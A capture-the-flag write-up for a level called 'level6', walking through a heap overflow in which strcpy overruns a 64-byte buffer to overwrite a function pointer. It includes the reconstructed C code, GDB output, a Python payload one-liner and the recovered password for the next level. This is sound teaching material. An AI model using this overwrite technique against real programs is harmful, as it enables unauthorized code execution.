# level6

This exercise focuses on heap exploitation. We must analyze how memory is allocated on the heap, how consecutive allocations behave, and how chunks are stacked.

Here is the reconstructed C code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void n(void) {
    system("/bin/cat /home/user/level7/.pass");
}

void m(void) {
    puts("Nope");
}

int main(int argc, char *argv[]) {
    char *dest;
    void (**fn_ptr)(void);

    dest = (char *)malloc(0x40);
    fn_ptr = (void (**)(void))malloc(sizeof(void *));
    *fn_ptr = m;

    if (argc > 1) {
        strcpy(dest, argv[1]);
    }

    (*fn_ptr)();
    return 0;
}
```

### Heap Chunk Layout

When `malloc` is called, the allocated block (chunk) in heap memory is structured as follows:
```text
[ metadata ]  <-- This metadata is 8 bytes long
[ userdata ]  <-- This is the pointer returned by malloc
```

When multiple chunks are allocated sequentially on the heap, they are stacked as follows:
```text
[ metadatac1 ]  <-- 8 bytes
[ userdatac1 ]  <-- dest pointer (64 bytes)
[ metadatac2 ]  <-- 8 bytes
[ userdatac2 ]  <-- fn_ptr pointer (4 bytes)
```

Here, the binary allocates 64 bytes for the `dest` buffer, followed by 4 bytes for the function pointer `fn_ptr` (which initially points to function `m`).

Because `strcpy` performs an unbounded copy, writing more than 64 bytes to `dest` overflows past the first chunk, allowing us to overwrite the metadata of the second chunk and hijack the function pointer `fn_ptr`.

To calculate the offset to `fn_ptr`:
- `64` bytes of `dest` user data.
- `8` bytes of chunk 2 metadata.
Total offset = `64 + 8 = 72` bytes.

### Finding the Target Address

We disassemble the binary using GDB to find the address of the target function `n`:
```text
(gdb) info functions
Non-debugging symbols:
...
0x08048454  n
0x08048468  m
...
```
The address of `n` is `0x08048454`.

### Building the Payload

We pad our input with 64 bytes (`U` * 64) for `dest`, 8 bytes (`M` * 8) for the metadata, and then the address of `n` reversed to little-endian using `[::-1]`:
```bash
python -c 'print "U" * 64 + "M" * 8 + "\x08\x04\x84\x54"[::-1]' > payload
```

And execute the binary passing the payload as an argument:
```bash
./level6 $(cat payload)
```
This overwrites `fn_ptr` to point to `n`, printing the password for `level7`:
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
